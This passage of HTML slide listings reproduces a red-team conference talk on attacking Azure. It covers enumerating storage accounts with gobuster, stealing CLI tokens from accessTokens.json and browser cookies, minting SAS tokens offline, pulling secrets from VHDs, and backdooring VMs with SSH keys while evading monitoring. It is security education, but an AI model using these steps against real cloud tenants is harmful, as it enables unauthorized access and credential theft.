+Apps..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_36.jpg">STORAGE … VMs Storage LBs Users Web Server Apps Hacker</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE
+.
+" title="Blue Cloud of Death: Red Teaming Azure STORAGE
+.
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_37.jpg">STORAGE .</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AZURE BLOBS
+Endpoints: https://myaccount.blob.c..." title="Blue Cloud of Death: Red Teaming Azure AZURE BLOBS
+Endpoints: https://myaccount.blob.c..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_38.jpg">AZURE BLOBS Endpoints: https://myaccount.blob.core.windows.net/mycontainer/myblob e.g.: https://bcodstoragetest005.blob.core.windows.net/containertest005/test.txt Storage Account Name: bcodstoragetest005</a>
+            </h3>
+            Container Name: containertest005 Blob Name: test.txt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DNS BRUTE FORCE
+e.g.: https://bcodstoragetest00..." title="Blue Cloud of Death: Red Teaming Azure DNS BRUTE FORCE
+e.g.: https://bcodstoragetest00..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_39.jpg">DNS BRUTE FORCE e.g.: https://bcodstoragetest005.blob.core.windows.net/containertest005/test.txt Storage Account Name: bcodstoragetest005 -</a>
+            </h3>
+            Only contains lowercase letters and numbers. - Name must be between 3 and 24 characters.
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="GOBUSTER - DNS
+e.g.: https://bcodstoragetest005..." title="Blue Cloud of Death: Red Teaming Azure GOBUSTER - DNS
+e.g.: https://bcodstoragetest005..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_40.jpg">GOBUSTER - DNS e.g.: https://bcodstoragetest005.blob.core.windows.net/containertest005/test.txt gobuster -m dns -u &quot;blob.core.windows.net&quot;</a>
+            </h3>
+            -i -t 100 -fw -w /root/blobdns/3_chars.txt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DNS BRUTE FORCE
+…
+…
+- Only contains lowercase l..." title="Blue Cloud of Death: Red Teaming Azure DNS BRUTE FORCE
+…
+…
+- Only contains lowercase l..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_41.jpg">DNS BRUTE FORCE … … - Only contains lowercase letters</a>
+            </h3>
+            and numbers. - Name must be between 3 and 24 characters. Lower Chars &amp; Nums Count Run Time (100 Threads) 3 46,656 ~1 min 4 1,679,616 ~25min 5 60,466,176 ~15 hours 6 … etc … … etc …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="GOBUSTER - DIR
+e.g.: https://bcodstoragetest005..." title="Blue Cloud of Death: Red Teaming Azure GOBUSTER - DIR
+e.g.: https://bcodstoragetest005..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_42.jpg">GOBUSTER - DIR e.g.: https://bcodstoragetest005.blob.core.windows.net/containertest005/test.txt gobuster -m dir -u “https://bcodstoragetest005.blob.core.windows.n</a>
+            </h3>
+            et” -i -t 100 -e -s 200,204 -w quickdir.txt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AZURE BLOB NAMES
+e.g.: https://bcodstoragetest0..." title="Blue Cloud of Death: Red Teaming Azure AZURE BLOB NAMES
+e.g.: https://bcodstoragetest0..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_43.jpg">AZURE BLOB NAMES e.g.: https://bcodstoragetest005.blob.core.windows.net/containertest005/test.txt Storage Account Name: bcodstoragetest005 Container</a>
+            </h3>
+            Name: containertest005 Blob Name: test.txt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="BRUTE FORCE
+Possible but kind of sucks to brute..." title="Blue Cloud of Death: Red Teaming Azure BRUTE FORCE
+Possible but kind of sucks to brute..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_44.jpg">BRUTE FORCE Possible but kind of sucks to brute force</a>
+            </h3>
+            or guess three separate variables/parameters in the URL. e.g.: https://bcodstoragetest005.blob.core.windows.net/containertest005/test.txt Storage Account Name: bcodstoragetest005 Container Name: containertest005 Blob Name: test.txt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE
+…
+VMs
+Storage
+LBs
+Users
+Web Server
+Apps..." title="Blue Cloud of Death: Red Teaming Azure STORAGE
+…
+VMs
+Storage
+LBs
+Users
+Web Server
+Apps..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_45.jpg">STORAGE … VMs Storage LBs Users Web Server Apps Hacker</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="NIMBUSLAND
+Check if an IP address is Azure or A..." title="Blue Cloud of Death: Red Teaming Azure NIMBUSLAND
+Check if an IP address is Azure or A..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_46.jpg">NIMBUSLAND Check if an IP address is Azure or AWS</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="LOLRUSLOVE
+Spider Website for Links to Azure Bl..." title="Blue Cloud of Death: Red Teaming Azure LOLRUSLOVE
+Spider Website for Links to Azure Bl..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_47.jpg">LOLRUSLOVE Spider Website for Links to Azure Blobs • CNAME</a>
+            </h3>
+            Lookup on FQDNS TODO: INSERT Screen Shot TODO: Demo?
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Storage Access
+…
+" title="Blue Cloud of Death: Red Teaming Azure Storage Access
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_48.jpg">Storage Access …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_49.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos STORAGE
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="FIND CERT
+*.publishsettings
+Get-AzurePublishSet..." title="Blue Cloud of Death: Red Teaming Azure FIND CERT
+*.publishsettings
+Get-AzurePublishSet..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_50.jpg">FIND CERT *.publishsettings Get-AzurePublishSettingsFile • Management Certificates A &quot;publish settings</a>
+            </h3>
+            file&quot; is an XML file with a .publishsettings file name extension. The file contains an encoded certificate that provides management credentials for your Azure subscriptions.
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="FIND SECRET
+“web.config” - ASP.NET
+“app.config”..." title="Blue Cloud of Death: Red Teaming Azure FIND SECRET
+“web.config” - ASP.NET
+“app.config”..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_51.jpg">FIND SECRET “web.config” - ASP.NET “app.config” - C#.NET • SAS</a>
+            </h3>
+            URI • Connection String • Account Name &amp; Key
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE EXPLORER
+“Install Azure Storage Explore..." title="Blue Cloud of Death: Red Teaming Azure STORAGE EXPLORER
+“Install Azure Storage Explore..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_52.jpg">STORAGE EXPLORER “Install Azure Storage Explorer”</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE EXPLORER
+• SAS URI
+• Connection String
+..." title="Blue Cloud of Death: Red Teaming Azure STORAGE EXPLORER
+• SAS URI
+• Connection String
+..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_53.jpg">STORAGE EXPLORER • SAS URI • Connection String • Account</a>
+            </h3>
+            Name &amp; Key
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE EXPLORER
+• Download Files!
+• Modify Fil..." title="Blue Cloud of Death: Red Teaming Azure STORAGE EXPLORER
+• Download Files!
+• Modify Fil..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_54.jpg">STORAGE EXPLORER • Download Files! • Modify Files!</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VHDS
+*disks*
+• vhds!
+" title="Blue Cloud of Death: Red Teaming Azure VHDS
+*disks*
+• vhds!
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_55.jpg">VHDS *disks* • vhds!</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VHDS
+Download vhds
+• Code Review
+• Secrets on D..." title="Blue Cloud of Death: Red Teaming Azure VHDS
+Download vhds
+• Code Review
+• Secrets on D..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_56.jpg">VHDS Download vhds • Code Review • Secrets on Disk</a>
+            </h3>
+            • Linux - grep for “shadow” hashes
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VHDS
+Download vhds
+• Code Review
+• Secrets on D..." title="Blue Cloud of Death: Red Teaming Azure VHDS
+Download vhds
+• Code Review
+• Secrets on D..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_57.jpg">VHDS Download vhds • Code Review • Secrets on Disk</a>
+            </h3>
+            • Linux - grep for “shadow” hashes
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="MANAGED DISKS
+2017 Azure Feature
+• By Default…
+..." title="Blue Cloud of Death: Red Teaming Azure MANAGED DISKS
+2017 Azure Feature
+• By Default…
+..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_58.jpg">MANAGED DISKS 2017 Azure Feature • By Default… • No</a>
+            </h3>
+            VHDs in blob storage containers!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Storage Persistence
+…
+" title="Blue Cloud of Death: Red Teaming Azure Storage Persistence
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_59.jpg">Storage Persistence …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_60.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos STORAGE
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STORAGE EXPLORER
+Create SAS!
+• Another way to a..." title="Blue Cloud of Death: Red Teaming Azure STORAGE EXPLORER
+Create SAS!
+• Another way to a..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_61.jpg">STORAGE EXPLORER Create SAS! • Another way to access the</a>
+            </h3>
+            resource
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DEMo: SAS Offline Minting!
+…
+" title="Blue Cloud of Death: Red Teaming Azure DEMo: SAS Offline Minting!
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_62.jpg">DEMo: SAS Offline Minting! …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SAS TOKEN OFFLINE
+MintyOffline
+Append the Follo..." title="Blue Cloud of Death: Red Teaming Azure SAS TOKEN OFFLINE
+MintyOffline
+Append the Follo..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_63.jpg">SAS TOKEN OFFLINE MintyOffline Append the Following: - Storage Account</a>
+            </h3>
+            Name - Permissions, Protocol - Service, Resource Type - Start Time, Expire Time - &amp; API Version HMAC to creation token using: - Key -&gt; Storage Key - Msg -&gt; Appended String - SHA256 Formatting of the Data (e.g. Encode)
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CLI Endpoint Access
+…
+" title="Blue Cloud of Death: Red Teaming Azure CLI Endpoint Access
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_64.jpg">CLI Endpoint Access …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_65.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos ENDPOINT
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SETUP CLI
+“Install Azure CLI 2.0 on Windows”
+" title="Blue Cloud of Death: Red Teaming Azure SETUP CLI
+“Install Azure CLI 2.0 on Windows”
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_66.jpg">SETUP CLI “Install Azure CLI 2.0 on Windows”</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CLI AUTH.
+“az login”
+(After logging in, your lo..." title="Blue Cloud of Death: Red Teaming Azure CLI AUTH.
+“az login”
+(After logging in, your lo..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_67.jpg">CLI AUTH. “az login” (After logging in, your login token</a>
+            </h3>
+            is valid until it goes for 14 days without being used.)
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="BROWSER COOKIE
+“az login”
+(After logging in, yo..." title="Blue Cloud of Death: Red Teaming Azure BROWSER COOKIE
+“az login”
+(After logging in, yo..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_68.jpg">BROWSER COOKIE “az login” (After logging in, your login token</a>
+            </h3>
+            is valid until it goes for 14 days without being used.)
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STEAL COOKIE!
+“az login”
+(After logging in, you..." title="Blue Cloud of Death: Red Teaming Azure STEAL COOKIE!
+“az login”
+(After logging in, you..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_69.jpg">STEAL COOKIE! “az login” (After logging in, your login token</a>
+            </h3>
+            is valid until it goes for 14 days without being used.)
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CLI AUTH.
+“az login”
+(After logging in, your lo..." title="Blue Cloud of Death: Red Teaming Azure CLI AUTH.
+“az login”
+(After logging in, your lo..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_70.jpg">CLI AUTH. “az login” (After logging in, your login token</a>
+            </h3>
+            is valid until it goes for 14 days without being used.)
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AUTH. TOKEN “.azure” folder
+“azureProfile.json”
+" title="Blue Cloud of Death: Red Teaming Azure AUTH. TOKEN “.azure” folder
+“azureProfile.json”
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_71.jpg">AUTH. TOKEN “.azure” folder “azureProfile.json”</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="STEAL TOKEN“.azure” folder
+“accessTokens.json”
+" title="Blue Cloud of Death: Red Teaming Azure STEAL TOKEN“.azure” folder
+“accessTokens.json”
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_72.jpg">STEAL TOKEN“.azure” folder “accessTokens.json”</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="WHOAMI
+“az account show”
+" title="Blue Cloud of Death: Red Teaming Azure WHOAMI
+“az account show”
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_73.jpg">WHOAMI “az account show”</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Expand Access
+…
+" title="Blue Cloud of Death: Red Teaming Azure Expand Access
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_74.jpg">Expand Access …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_75.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Hacker DATA -&gt; CONTROL
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AZURE META
+Metadata Service: 169.254.169.254
+cu..." title="Blue Cloud of Death: Red Teaming Azure AZURE META
+Metadata Service: 169.254.169.254
+cu..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_76.jpg">AZURE META Metadata Service: 169.254.169.254 curl http://169.254.169.254/metadata/v1/maintenance curl http://169.254.169.254/metadata/v1/InstanceInfo (these</a>
+            </h3>
+            are mostly useless for hackers…) but useful information is copied into the … /var/lib/waagent directory when the instance is created… (root access needed) • IP address, hostname, subscription ID, resource group name, etc… …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_77.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Hacker CONTROL -&gt; DATA
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CAPTURE IMAGE
+…
+" title="Blue Cloud of Death: Red Teaming Azure CAPTURE IMAGE
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_78.jpg">CAPTURE IMAGE …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="HARD BOOT
+Google: “Reset local Windows password..." title="Blue Cloud of Death: Red Teaming Azure HARD BOOT
+Google: “Reset local Windows password..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_79.jpg">HARD BOOT Google: “Reset local Windows password for Azure VM</a>
+            </h3>
+            offline” … Horrible OPSEC but it works… - Power off a server - Mount the server’s hard drive using another VM - Modify the server for remote access (e.g. add an SSH key to root user) - Power back on the server &amp; PROFIT!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="RESET
+…
+Windows
+• RDP Password Reset
+Linux
+• SS..." title="Blue Cloud of Death: Red Teaming Azure RESET
+…
+Windows
+• RDP Password Reset
+Linux
+• SS..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_80.jpg">RESET … Windows • RDP Password Reset Linux • SSH</a>
+            </h3>
+            Key Reset • Create User
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SCRIPTS
+…
+Linux
+• VM Extension - CustomScript
+" title="Blue Cloud of Death: Red Teaming Azure SCRIPTS
+…
+Linux
+• VM Extension - CustomScript
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_81.jpg">SCRIPTS … Linux • VM Extension - CustomScript</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Persistence
+…
+" title="Blue Cloud of Death: Red Teaming Azure Persistence
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_82.jpg">Persistence …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." title="Blue Cloud of Death: Red Teaming Azure Azure CIoud
+Portal Control
+Storage
+Data
+Apps
+Ad..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_83.jpg">Azure CIoud Portal Control Storage Data Apps Admin … LBs</a>
+            </h3>
+            … CI Pipeline Users VMs Dev Internet Collaboration Hacker Repos CONTROL
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SERVICE PRINCIPALS
+(the recommended approach)
+P..." title="Blue Cloud of Death: Red Teaming Azure SERVICE PRINCIPALS
+(the recommended approach)
+P..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_84.jpg">SERVICE PRINCIPALS (the recommended approach) Permissions-Restricted Accounts “az login --service-principal”</a>
+            </h3>
+            … …not tied to any particular user… …have permissions on them assigned through pre-defined roles. Multiple Passwords!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AGENTS
+Azure CIoud
+Portal
+VMs
+Control
+Storage
+D..." title="Blue Cloud of Death: Red Teaming Azure AGENTS
+Azure CIoud
+Portal
+VMs
+Control
+Storage
+D..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_85.jpg">AGENTS Azure CIoud Portal VMs Control Storage Data Apps Admin</a>
+            </h3>
+            … LBs Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="DOCUMENTATION?
+Where we&#39;re going, we don&#39;t need..." title="Blue Cloud of Death: Red Teaming Azure DOCUMENTATION?
+Where we&amp;#39;re going, we don&amp;#39;t need..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_86.jpg">DOCUMENTATION? Where we&#39;re going, we don&#39;t need docs!</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="START DIGGING
+• ps auxfww
+• file
+• python sourc..." title="Blue Cloud of Death: Red Teaming Azure START DIGGING
+• ps auxfww
+• file
+• python sourc..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_87.jpg">START DIGGING • ps auxfww • file • python source</a>
+            </h3>
+            code review Listening Services • netstat -nltpu Active Connections • netstat -natpu
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="• b: set a breakpoint
+• c: continue debugging u..." title="Blue Cloud of Death: Red Teaming Azure • b: set a breakpoint
+• c: continue debugging u..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_88.jpg">• b: set a breakpoint • c: continue debugging until</a>
+            </h3>
+            you hit a breakpoint • s: step through the code • n: to go to next line of code • l: list source code for the current file (default: 11 lines including the line being executed) • u: navigate up a stack frame • d: navigate down a stack frame • p: to print the value of an expression in the current context PYTHON DEBUGGER • pdb
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="SYSDIG sysdig -w 005.scap
+systemctl start walin..." title="Blue Cloud of Death: Red Teaming Azure SYSDIG sysdig -w 005.scap
+systemctl start walin..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_89.jpg">SYSDIG sysdig -w 005.scap systemctl start walinuxagent.service /usr/bin/python3 -u /usr/sbin/waagent</a>
+            </h3>
+            –daemon sysdig -r 005.scap … • -c topfiles_bytes • -c topprocs_net • -c echo_fds • -c fdbytes_by fd.directory &quot;fd.type=file“ • -c fdbytes_by fd.filename &quot;fd.directory=/var/lib/waagent“ …
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="TCPDUMP ip.addr == 168.63.129.16
+" title="Blue Cloud of Death: Red Teaming Azure TCPDUMP ip.addr == 168.63.129.16
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_90.jpg">TCPDUMP ip.addr == 168.63.129.16</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AGENTS
+Azure CIoud
+Portal
+VMs
+Control
+http://16..." title="Blue Cloud of Death: Red Teaming Azure AGENTS
+Azure CIoud
+Portal
+VMs
+Control
+http://16..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_91.jpg">AGENTS Azure CIoud Portal VMs Control http://168.63.129.16 Storage Data Apps</a>
+            </h3>
+            Admin … LBs Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="TASKS
+Periodically pulls HTTP API for taskings
+..." title="Blue Cloud of Death: Red Teaming Azure TASKS
+Periodically pulls HTTP API for taskings
+..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_92.jpg">TASKS Periodically pulls HTTP API for taskings • http://168.63.129.16 •</a>
+            </h3>
+            (local azure fabric address) &lt;Incarnation&gt;2&lt;/Incarnation&gt; • Signals agent for additional tasks Control http://168.63.129.16 GET /machine/?comp=goalstate --- &lt;Incarnation&gt;2&lt;/Incarnation&gt;… Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="HOST CONFIGS
+Pulls hostingEnvironmentConfig
+Con..." title="Blue Cloud of Death: Red Teaming Azure HOST CONFIGS
+Pulls hostingEnvironmentConfig
+Con..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_93.jpg">HOST CONFIGS Pulls hostingEnvironmentConfig Control http://168.63.129.16 GET /machine/ … type=</a>
+            </h3>
+            hostingEnvironmentConfig --- rd_fabric_stable_dhf5.150807- 2320.RuntimePackage_1.0.0.14. zip Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CERTS
+Pulls certificates
+Control
+http://168.63...." title="Blue Cloud of Death: Red Teaming Azure CERTS
+Pulls certificates
+Control
+http://168.63...." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_94.jpg">CERTS Pulls certificates Control http://168.63.129.16 GET /machine/ … comp=certificates ---</a>
+            </h3>
+            pfx Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="EXTENSION CONFIGS
+Pulls Extension Configuration..." title="Blue Cloud of Death: Red Teaming Azure EXTENSION CONFIGS
+Pulls Extension Configuration..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_95.jpg">EXTENSION CONFIGS Pulls Extension Configuration • In this case, the</a>
+            </h3>
+            command to run Control http://168.63.129.16 GET /machine/ … type=extensionsConfig --- Command to Run Agent
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="the Journey!
+…
+" title="Blue Cloud of Death: Red Teaming Azure the Journey!
+…
+" href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_96.jpg">the Journey! …</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Portal Control
+Storage
+Data
+Admin
+…
+…
+CI
+Pi..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Portal Control
+Storage
+Data
+Admin
+…
+…
+CI
+Pi..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_97.jpg">VMs Portal Control Storage Data Admin … … CI Pipeline</a>
+            </h3>
+            Users VMs Dev Internet Hacker Repos CREDS IN REPO
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Portal Control
+Storage
+Data
+Admin
+…
+…
+CI
+Pi..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Portal Control
+Storage
+Data
+Admin
+…
+…
+CI
+Pi..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_98.jpg">VMs Portal Control Storage Data Admin … … CI Pipeline</a>
+            </h3>
+            Users VMs Dev Internet Hacker Repos VHDS -&gt; CERTS
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Portal Control
+Storage
+Data
+Admin
+…
+…
+CI
+Pi..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Portal Control
+Storage
+Data
+Admin
+…
+…
+CI
+Pi..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_99.jpg">VMs Portal Control Storage Data Admin … … CI Pipeline</a>
+            </h3>
+            Users VMs Dev Internet Hacker Repos SUBSCRIPTION
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Control
+Storage
+Data Users
+VMs
+Hacker
+CUSTO..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Control
+Storage
+Data Users
+VMs
+Hacker
+CUSTO..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_100.jpg">VMs Control Storage Data Users VMs Hacker CUSTOM SCRIPT</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="PERSIST?
+Without getting caught?
+Bypass
+• File ..." title="Blue Cloud of Death: Red Teaming Azure PERSIST?
+Without getting caught?
+Bypass
+• File ..." href="https://files.speakerdeck.com/presentations/c2f4f81429694727a2667199cc9fac14/slide_101.jpg">PERSIST? Without getting caught? Bypass • File Integrity Monitoring •</a>
+            </h3>
+            So we can’t modify files • osquery - process list • So we can’t be seen in ps • osquery - netstat • So we can’t be seen in netstat … ?
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="VMs
+Storage
+Users
+Hacker
+AGENT
+Control
+http://1..." title="Blue Cloud of Death: Red Teaming Azure VMs
+Storage
+Users
+Hacker
+AGENT
+Control
